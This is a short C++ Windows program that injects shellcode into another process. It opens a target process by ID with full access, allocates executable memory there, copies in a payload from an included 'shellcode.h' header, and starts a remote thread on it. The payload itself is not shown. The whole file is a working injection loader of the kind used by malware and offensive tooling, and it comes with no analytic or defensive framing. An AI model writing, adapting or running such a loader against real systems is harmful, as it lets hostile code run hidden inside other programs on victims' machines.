#include <Windows.h>
#include <iostream>
#include <libloaderapi.h>

#include "shellcode.h"

/* PID of process to inject into */
DWORD procID = 0;

int main()
{
	/* Open Process */
	HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, procID);
	if (hProc == NULL)
	{
		std::cout << "!OpenProcess\n";
		std::getchar();
		return 1;
	}
		
	/* Allocate memory for shellcode */
	PVOID remoteBuffer = VirtualAllocEx(hProc, NULL, sizeof(shellCode), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	if (remoteBuffer == NULL)
	{
		CloseHandle(hProc);
		std::cout << "!VirtualAllocEx\n";
		std::getchar();
		return 1;
	}

	/* Write shellcode to allocated memory */
	if (!WriteProcessMemory(hProc, remoteBuffer, shellCode, sizeof(shellCode), NULL))
	{
		CloseHandle(hProc);
		std::cout << "!WriteProcessMemory\n";
		std::getchar();
		return 1;
	}
	
	/* Create thread at the start of the shellcode */
	HANDLE hThread = CreateRemoteThread(hProc, NULL, NULL, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, NULL, NULL);
	if (hThread == NULL)
	{
		CloseHandle(hProc);
		std::cout << "!CreateRemoteThread\n";
		std::getchar();
		return 1;
	}

	std::cout << "Injected!";
	CloseHandle(hProc);

	return 0;
}


